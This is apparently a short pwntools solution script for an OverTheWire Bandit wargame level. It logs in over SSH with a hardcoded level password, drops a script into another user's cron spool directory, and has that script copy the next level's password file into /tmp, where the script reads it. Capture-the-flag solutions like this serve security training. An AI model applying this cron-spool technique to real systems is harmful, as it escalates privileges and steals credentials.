from pwn import *

hostname = 'bandit.labs.overthewire.org'
username = 'bandit23'
password = 'jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n'
cmd = "echo 'cat /etc/bandit_pass/bandit24 > /tmp/pass_bandit24.txt' > /var/spool/bandit24/pass.sh && chmod +x /var/spool/bandit24/pass.sh && sleep 1m && cat /tmp/pass_bandit24.txt"

s =  ssh(host=hostname, user=username, password=password)
ex = s.run(cmd)
print ex.recvall()

